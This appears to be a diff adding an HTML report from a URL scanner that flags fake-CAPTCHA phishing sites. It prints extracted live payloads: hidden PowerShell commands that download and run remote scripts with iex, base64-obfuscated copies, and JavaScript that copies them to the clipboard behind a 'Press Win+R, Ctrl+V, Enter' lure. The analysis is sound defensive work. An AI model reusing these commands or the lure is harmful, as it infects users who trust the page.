@@ -1,0 +1,483 @@
+
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>ClickGrab - URL Analysis Report</title>
+        <style>
+            body { font-family: Arial, sans-serif; margin: 20px; }
+            h1, h2, h3 { color: #333; }
+            .site { border: 1px solid #ddd; margin: 10px 0; padding: 10px; border-radius: 5px; }
+            .site.suspicious { border-color: #ff9999; background-color: #ffeeee; }
+            .site-url { font-weight: bold; }
+            .indicator { margin: 5px 0; }
+            .indicator-title { font-weight: bold; }
+            .summary { background-color: #f5f5f5; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
+            pre { background-color: #f8f8f8; padding: 10px; border-radius: 3px; overflow-x: auto; }
+            .highlight { background-color: yellow; }
+            .risk-high { color: #d9534f; font-weight: bold; }
+            .risk-medium { color: #f0ad4e; }
+            .risk-low { color: #5bc0de; }
+            .total-indicators { font-size: 1.2em; margin-top: 10px; }
+            .score-display { 
+                display: inline-block; 
+                padding: 5px 10px; 
+                border-radius: 4px; 
+                font-weight: bold; 
+                margin-left: 10px;
+                color: white;
+            }
+            .score-high { background-color: #d9534f; }
+            .score-medium { background-color: #f0ad4e; }
+            .score-low { background-color: #5bc0de; }
+            .score-none { background-color: #5cb85c; }
+        </style>
+    </head>
+    <body>
+        <h1>ClickGrab URL Analysis Report</h1>
+        <div class="summary">
+            <p><strong>Generated:</strong> 2025-08-17 02:48:53</p>
+            <p><strong>Sites Analyzed:</strong> 14</p>
+            <p><strong>Suspicious Sites:</strong> 8</p>
+        </div>
+        
+        <h2>Analysis Results</h2>
+    
+        <div class="site ">
+            <h3 class="site-url">http://darkteenporn.net/</h3>
+            <p>
+                <strong>Verdict:</strong> ✅ Likely Safe
+                <span class="score-display score-low">Score: 15</span>
+            </p>
+            <p class="total-indicators"><strong>Total Indicators:</strong> 1</p>
+        
+            <div class="indicator">
+                <p class="indicator-title risk-high">JavaScript Redirects and Loaders (1)</p>
+                <ul>
+            <li><pre>Suspicious JavaScript redirect pattern: ...html><html><head><script>window.onload=function(){window.location.href="/lander"}</script></head></html>...</pre></li></ul></div></div>
+        <div class="site suspicious">
+            <h3 class="site-url">https://blessdayservices.org/up/</h3>
+            <p>
+                <strong>Verdict:</strong> ⚠️ SUSPICIOUS
+                <span class="score-display score-high">Score: 295</span>
+            </p>
+            <p class="total-indicators"><strong>Total Indicators:</strong> 45</p>
+        
+            <div class="indicator">
+                <p class="indicator-title">PowerShell Commands (3)</p>
+                <ul>
+            <li><pre>powershell -ArgumentList '-w hidden -c iwr https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1 | iex' -WindowStyle Hidden\"";</pre></li><li><pre>powershell " + htaPath;</pre></li><li><pre>iwr </pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">PowerShell Downloads (1)</p>
+                <ul>
+            <li><strong>Full Match:</strong> iwr https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1 | iex...</li><li><strong>URL:</strong> https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1</li><li><strong>Risk Level:</strong> <span class='risk-high'>High Risk</span></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Clipboard Manipulation (3)</p>
+                <ul>
+            <li><pre>...); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextA...</pre></li><li><pre>...ck", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "21px 0 0 12px"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" && verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "â ''I am not a robot - reCAPTCHA Verification Hash: " const end = "''" const textToCopy = commandToRun + suffix + ploy + verification_id + end setClipboardCopyData(textToCopy); } function showVerifyWindow()...</pre></li><li><pre>...dy.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");...</pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Clipboard Commands (1)</p>
+                <ul>
+            <li><pre>powershell </pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">CAPTCHA Elements (4)</p>
+                <ul>
+            <li><pre><img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""></pre></li><li><pre>...="" id="spinner"> </div> <div id="verify-window" class="verify-window"> <div class="verify-container"> <header class="verify-header"> <span class="verify-header-text-medium m-p block">Complete these</span> <span class="verify-header-text-big m-p block">Verification Steps</span> <span class="verify-header-text-medium m-p block"></span> </header> <main class="verify-main"> <p> To better prove you are not a robot, please: </p> <ol> <li> Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>. </li> <li> In the verification window, press <b>Ctrl</b> + <b>V</b>. </li> <li> Press <b>Enter</b> on your keyboard to finish. </li> </ol> <p> You will observe and agree: <br> <code> â "I am not a robot - reCAPTCHA Verification Hash: <span id="verification-id">1110</span>" </code> </p> </main> </div> <footer class="verify-container verif...</pre></li><li><pre><div class="verify-footer-left"> Perform the steps above to finish verification. </div></pre></li><li><pre><p class="im-not-a-robot m-p line-normal">I'm not a robot</p></pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Suspicious Commands (3)</p>
+                <ul>
+            <li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-high'>High Risk</span></li><li><strong>Command:</strong> <pre>powershell -ArgumentList '-w hidden -c iwr https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1 | iex' -WindowStyle Hidden\"";</pre></li><li><strong>Source:</strong> HTML/JavaScript</li><li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-medium'>Medium Risk</span></li><li><strong>Command:</strong> <pre>powershell " + htaPath;</pre></li><li><strong>Source:</strong> HTML/JavaScript</li><li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-medium'>Medium Risk</span></li><li><strong>Command:</strong> <pre>iwr </pre></li><li><strong>Source:</strong> HTML/JavaScript</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title risk-high">⚠️ High Risk Commands Summary (1)</p>
+                <ul>
+            <li><strong>PowerShell:</strong> <pre>powershell -ArgumentList '-w hidden -c iwr https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps...</pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Suspicious Keywords (20)</p>
+                <ul>
+            <li>CAPTCHA Verification</li><li>Verification Hash</li><li>I am not a robot</li><li>CAPTCHA</li><li>captcha-iogo</li><li>captcha</li><li>CAPTCHA-iogo</li><li>CaptchaListeners</li><li>CaptchaCheckbox</li><li>CaptchaLoading</li><li>Robot</li><li>robot</li><li>Verification</li><li>verification</li><li>verification-id</li><li>verification_id</li><li>To better prove you are not a robot</li><li>iex</li><li>Hidden</li><li>hidden</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">URLs (5)</p>
+                <ul>
+            <li>https://use.fontawesome.com/releases/v5.0.0/css/all.css</li><li>https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</li><li>https://www.google.com/intl/en/policies/privacy/</li><li>https://www.google.com/intl/en/policies/terms/</li><li>https://irp.cdn-website.com/45d8c6e0/files/uploaded/32.ps1</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Proxy/Security Tool Evasion (5)</p>
+                <ul>
+            <li><pre>...if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) { document.getElementById...</pre></li><li><pre>...} function stageClipboard(commandToRun, verification_id){ const suffix = "...</pre></li><li><pre>...end = "''" const textToCopy = commandToRun + suffix + ploy + verification_id + end...</pre></li><li><pre>...-WindowStyle Hidden\""; const commandToRun = "powershell " + htaPath; stageCli...</pre></li><li><pre>...ll " + htaPath; stageClipboard(commandToRun, verification_id); } addCaptc...</pre></li></ul></div></div>
+        <div class="site ">
+            <h3 class="site-url">https://admin.gestroom.it/</h3>
+            <p>
+                <strong>Verdict:</strong> ✅ Likely Safe
+                <span class="score-display score-low">Score: 1</span>
+            </p>
+            <p class="total-indicators"><strong>Total Indicators:</strong> 1</p>
+        
+            <div class="indicator">
+                <p class="indicator-title">URLs (1)</p>
+                <ul>
+            <li>https://t.me/LearnUSDT_bot?start=540835569</li></ul></div></div>
+        <div class="site suspicious">
+            <h3 class="site-url">https://test.peperoncinochepassione.it/</h3>
+            <p>
+                <strong>Verdict:</strong> ⚠️ SUSPICIOUS
+                <span class="score-display score-high">Score: 346</span>
+            </p>
+            <p class="total-indicators"><strong>Total Indicators:</strong> 49</p>
+        
+            <div class="indicator">
+                <p class="indicator-title">Base64 Strings (3)</p>
+                <ul>
+            <li><strong>Encoded:</strong> aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcX...</li><li><strong>Decoded:</strong> <pre>iex (iwr 'https://nicostudio.it/pZJHqter.txt' -UseBasicParsing).Content...</pre></li><li><strong>Contains PowerShell:</strong> Yes ⚠️</li><li><strong>Encoded:</strong> aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcX...</li><li><strong>Decoded:</strong> <pre>iex (iwr 'https://nicostudio.it/pZJHqter.txt' -UseBasicParsing).Content...</pre></li><li><strong>Contains PowerShell:</strong> Yes ⚠️</li><li><strong>Encoded:</strong> aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcX...</li><li><strong>Decoded:</strong> <pre>iex (iwr 'https://nicostudio.it/pZJHqter.txt' -UseBasicParsing).Content...</pre></li><li><strong>Contains PowerShell:</strong> Yes ⚠️</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">PowerShell Commands (3)</p>
+                <ul>
+            <li><pre>PowErsHeLL -W hiddEn "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcXRlci50eHQnIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ=')) | iex"`;</pre></li><li><pre>iex (iwr 'https://nicostudio.it/pZJHqter.txt' -UseBasicParsing)</pre></li><li><pre>iwr </pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Clipboard Manipulation (3)</p>
+                <ul>
+            <li><pre>...tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempText...</pre></li><li><pre>...k", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "0"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" && verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "â ''I am not a robot - reCAPTCHA Verification ID: " const end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy); } function showVerifyWindow() {...</pre></li><li><pre>...y.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");...</pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Clipboard Commands (1)</p>
+                <ul>
+            <li><pre>PowErsHeLL -W hiddEn </pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">CAPTCHA Elements (7)</p>
+                <ul>
+            <li><pre><img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""></pre></li><li><pre>...<div class="overlay" id="overlay"></div> <div class="recaptcha-box"> <h2>Verify You Are Human</h2> <p>Please verify that you are a human to continue.</p> <div class="container m-p"> <div id="checkbox-window" class="checkbox-window m-p block"> <div class="checkbox-container m-p"> <button type="button" id="checkbox" class="checkbox m-p line-normal"></button> </div> <p style="margin: 0 !important;" cla...</pre></li><li><pre>...id="spinner"> </div> <div id="verify-window" class="verify-window"> <div class="verify-container"> <header class="verify-header"> <span class="verify-header-text-medium m-p block">Complete these</span> <span class="verify-header-text-big m-p block">Verification Steps</span> <span class="verify-header-text-medium m-p block"></span> </header> <main class="verify-main"> <p> To better prove you are not a robot, please: </p> <ol> <li> Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>. </li> <li> In the verification window, press <b>Ctrl</b> + <b>V</b>. </li> <li> Press <b>Enter</b> on your keyboard to finish. </li> </ol> <p> You will observe and agree: <br> <code> â "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>" </code> </p> </main> </div> <footer class="verify-container veri...</pre></li><li><pre><div class="verify-footer-left"> Perform the steps above to finish verification. </div></pre></li><li><pre><title>Verify You Are Human</title></pre></li><li><pre><h2>Verify You Are Human</h2></pre></li><li><pre><p style="margin: 0 !important;" class="im-not-a-robot m-p line-normal">I'm not a robot</p></pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Suspicious Commands (3)</p>
+                <ul>
+            <li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-high'>High Risk</span></li><li><strong>Command:</strong> <pre>PowErsHeLL -W hiddEn "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vbmljb3N0dWRpby5pdC9wWkpIcXRlci50eHQnIC1Vc2VCYXNpY1BhcnNpbmcpLkNvbnRlbnQ=')) | iex"`;</pre></li><li><strong>Source:</strong> HTML/JavaScript</li><li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-high'>High Risk</span></li><li><strong>Command:</strong> <pre>iex (iwr 'https://nicostudio.it/pZJHqter.txt' -UseBasicParsing)</pre></li><li><strong>Source:</strong> HTML/JavaScript</li><li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-medium'>Medium Risk</span></li><li><strong>Command:</strong> <pre>iwr </pre></li><li><strong>Source:</strong> HTML/JavaScript</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title risk-high">⚠️ High Risk Commands Summary (2)</p>
+                <ul>
+            <li><strong>PowerShell:</strong> <pre>PowErsHeLL -W hiddEn "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0d...</pre></li><li><strong>PowerShell:</strong> <pre>iex (iwr 'https://nicostudio.it/pZJHqter.txt' -UseBasicParsing)</pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Suspicious Keywords (23)</p>
+                <ul>
+            <li>CAPTCHA Verification</li><li>Verification ID</li><li>I am not a robot</li><li>captcha-box</li><li>captcha-iogo</li><li>captcha</li><li>CAPTCHA-iogo</li><li>CAPTCHA</li><li>CaptchaListeners</li><li>CaptchaCheckbox</li><li>CaptchaLoading</li><li>robot</li><li>Robot</li><li>Verification</li><li>verification</li><li>verification-id</li><li>verification_id</li><li>Verify You Are Human</li><li>To better prove you are not a robot</li><li>PowErsHeLL</li><li>iex</li><li>hidden</li><li>hiddEn</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">URLs (2)</p>
+                <ul>
+            <li>https://use.fontawesome.com/releases/v5.0.0/css/all.css</li><li>https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Proxy/Security Tool Evasion (4)</p>
+                <ul>
+            <li><pre>...} function stageClipboard(commandToRun, verification_id){ const suffix =...</pre></li><li><pre>...end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy)...</pre></li><li><pre>...extContent = verification_id; const commandToRun = `PowErsHeLL -W hiddEn "[Text.Encoding]::UTF8....</pre></li><li><pre>...NvbnRlbnQ=')) | iex"`; stageClipboard(commandToRun, verification_id); } addCaptchaListeners();...</pre></li></ul></div></div>
+        <div class="site ">
+            <h3 class="site-url">https://first-security-verden.de/</h3>
+            <p>
+                <strong>Verdict:</strong> ✅ Likely Safe
+                <span class="score-display score-low">Score: 5</span>
+            </p>
+            <p class="total-indicators"><strong>Total Indicators:</strong> 5</p>
+        
+            <div class="indicator">
+                <p class="indicator-title">URLs (5)</p>
+                <ul>
+            <li>https://www.webgo.de/assets/images/misc/hazard-50x50.png</li><li>https://www.webgo.de/assets/images/misc/hazard-50x50.png</li><li>https://www.webgo.de/assets/images/logo.svg</li><li>https://www.webgo.de/assets/images/misc/construction.png</li><li>https://www.webgo.de/webhosting/</li></ul></div></div>
+        <div class="site ">
+            <h3 class="site-url">https://www.first-security-verden.de/</h3>
+            <p>
+                <strong>Verdict:</strong> ✅ Likely Safe
+                <span class="score-display score-low">Score: 5</span>
+            </p>
+            <p class="total-indicators"><strong>Total Indicators:</strong> 5</p>
+        
+            <div class="indicator">
+                <p class="indicator-title">URLs (5)</p>
+                <ul>
+            <li>https://www.webgo.de/assets/images/misc/hazard-50x50.png</li><li>https://www.webgo.de/assets/images/misc/hazard-50x50.png</li><li>https://www.webgo.de/assets/images/logo.svg</li><li>https://www.webgo.de/assets/images/misc/construction.png</li><li>https://www.webgo.de/webhosting/</li></ul></div></div>
+        <div class="site suspicious">
+            <h3 class="site-url">https://www.website.mypetapp.co.za/</h3>
+            <p>
+                <strong>Verdict:</strong> ⚠️ SUSPICIOUS
+                <span class="score-display score-high">Score: 340</span>
+            </p>
+            <p class="total-indicators"><strong>Total Indicators:</strong> 47</p>
+        
+            <div class="indicator">
+                <p class="indicator-title">Base64 Strings (3)</p>
+                <ul>
+            <li><strong>Encoded:</strong> aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS...</li><li><strong>Decoded:</strong> <pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content...</pre></li><li><strong>Contains PowerShell:</strong> Yes ⚠️</li><li><strong>Encoded:</strong> aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS...</li><li><strong>Decoded:</strong> <pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content...</pre></li><li><strong>Contains PowerShell:</strong> Yes ⚠️</li><li><strong>Encoded:</strong> aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS...</li><li><strong>Decoded:</strong> <pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing).Content...</pre></li><li><strong>Contains PowerShell:</strong> Yes ⚠️</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">PowerShell Commands (3)</p>
+                <ul>
+            <li><pre>POWerShEll -W h "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex"`;</pre></li><li><pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing)</pre></li><li><pre>iwr </pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Clipboard Manipulation (3)</p>
+                <ul>
+            <li><pre>...tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempText...</pre></li><li><pre>...k", function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; checkboxBtnSpinner.style.animation = "spin 1s linear infinite"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.opacity = "0"; checkboxBtnSpinner.style.animation = "none"; setTimeout(function() { checkboxBtnSpinner.style.visibility = "hidden"; }, 500); } function hideCaptchaCheckbox() { checkboxBtn.style.visibility = "hidden"; checkboxBtn.style.opacity = "0"; } function showCaptchaCheckbox() { checkboxBtn.style.width = "100%"; checkboxBtn.style.height = "100%"; checkboxBtn.style.borderRadius = "2px"; checkboxBtn.style.margin = "0"; checkboxBtn.style.opacity = "1"; } function hideCaptchaCheckbox() { checkboxBtn.style.width = "4px"; checkboxBtn.style.height = "4px"; checkboxBtn.style.borderRadius = "50%"; checkboxBtn.style.marginLeft = "25px"; checkboxBtn.style.marginTop = "33px"; checkboxBtn.style.opacity = "0"; } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = "visible"; checkboxBtnSpinner.style.opacity = "1"; } function hideCaptchaLoading() { checkboxBtnSpinner.style.visibility = "hidden"; checkboxBtnSpinner.style.opacity = "0"; } function generateRandomNumber() { const min = 1000; const max = 9999; return Math.floor(Math.random() * (max - min + 1) + min).toString(); } function closeverifywindow() { verifywindow.style.display = "none"; verifywindow.style.visibility = "hidden"; verifywindow.style.opacity = "0"; showCaptchaCheckbox(); hideCaptchaLoading(); checkboxBtn.disabled = false; } function isverifywindowVisible() { return verifywindow.style.display !== "none" && verifywindow.style.display !== ""; } function setClipboardCopyData(textToCopy){ const tempTextArea = document.createElement("textarea"); tempTextArea.value = textToCopy; document.body.append(tempTextArea); tempTextArea.select(); document.execCommand("copy"); document.body.removeChild(tempTextArea); } function stageClipboard(commandToRun, verification_id){ const suffix = " # " const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: " const end = "''" const textToCopy = commandToRun setClipboardCopyData(textToCopy); } function showVerifyWindow() {...</pre></li><li><pre>...y.append(tempTextArea); tempTextArea.select(); document.execCommand("copy");...</pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Clipboard Commands (1)</p>
+                <ul>
+            <li><pre>POWerShEll -W h </pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">CAPTCHA Elements (7)</p>
+                <ul>
+            <li><pre><img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""></pre></li><li><pre>...<div class="overlay" id="overlay"></div> <div class="recaptcha-box"> <h2>Verify You Are Human</h2> <p>Please verify that you are a human to continue.</p> <div class="container m-p"> <div id="checkbox-window" class="checkbox-window m-p block"> <div class="checkbox-container m-p"> <button type="button" id="checkbox" class="checkbox m-p line-normal"></button> </div> <p style="margin: 0 !important;" cla...</pre></li><li><pre>...id="spinner"> </div> <div id="verify-window" class="verify-window"> <div class="verify-container"> <header class="verify-header"> <span class="verify-header-text-medium m-p block">Complete these</span> <span class="verify-header-text-big m-p block">Verification Steps</span> <span class="verify-header-text-medium m-p block"></span> </header> <main class="verify-main"> <p> To better prove you are not a robot, please: </p> <ol> <li> Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>. </li> <li> In the verification window, press <b>Ctrl</b> + <b>V</b>. </li> <li> Press <b>Enter</b> on your keyboard to finish. </li> </ol> <p> You will observe and agree: <br> <code> ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>" </code> </p> </main> </div> <footer class="verify-container veri...</pre></li><li><pre><div class="verify-footer-left"> Perform the steps above to finish verification. </div></pre></li><li><pre><title>Verify You Are Human</title></pre></li><li><pre><h2>Verify You Are Human</h2></pre></li><li><pre><p style="margin: 0 !important;" class="im-not-a-robot m-p line-normal">I'm not a robot</p></pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Suspicious Commands (3)</p>
+                <ul>
+            <li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-high'>High Risk</span></li><li><strong>Command:</strong> <pre>POWerShEll -W h "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50')) | iex"`;</pre></li><li><strong>Source:</strong> HTML/JavaScript</li><li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-high'>High Risk</span></li><li><strong>Command:</strong> <pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicParsing)</pre></li><li><strong>Source:</strong> HTML/JavaScript</li><li><strong>Type:</strong> PowerShell</li><li><strong>Risk Level:</strong> <span class='risk-medium'>Medium Risk</span></li><li><strong>Command:</strong> <pre>iwr </pre></li><li><strong>Source:</strong> HTML/JavaScript</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title risk-high">⚠️ High Risk Commands Summary (2)</p>
+                <ul>
+            <li><strong>PowerShell:</strong> <pre>POWerShEll -W h "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4IChpd3IgJ2h0dHBzOi...</pre></li><li><strong>PowerShell:</strong> <pre>iex (iwr 'https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt' -UseBasicPa...</pre></li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Suspicious Keywords (21)</p>
+                <ul>
+            <li>CAPTCHA Verification</li><li>Verification ID</li><li>I am not a robot</li><li>captcha-box</li><li>captcha-iogo</li><li>captcha</li><li>CAPTCHA-iogo</li><li>CAPTCHA</li><li>CaptchaListeners</li><li>CaptchaCheckbox</li><li>CaptchaLoading</li><li>robot</li><li>Robot</li><li>Verification</li><li>verification</li><li>verification-id</li><li>verification_id</li><li>Verify You Are Human</li><li>To better prove you are not a robot</li><li>iex</li><li>hidden</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">URLs (2)</p>
+                <ul>
+            <li>https://use.fontawesome.com/releases/v5.0.0/css/all.css</li><li>https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</li></ul></div>
+            <div class="indicator">
+                <p class="indicator-title">Proxy/Security Tool Evasion (4)</p>
+                <ul>
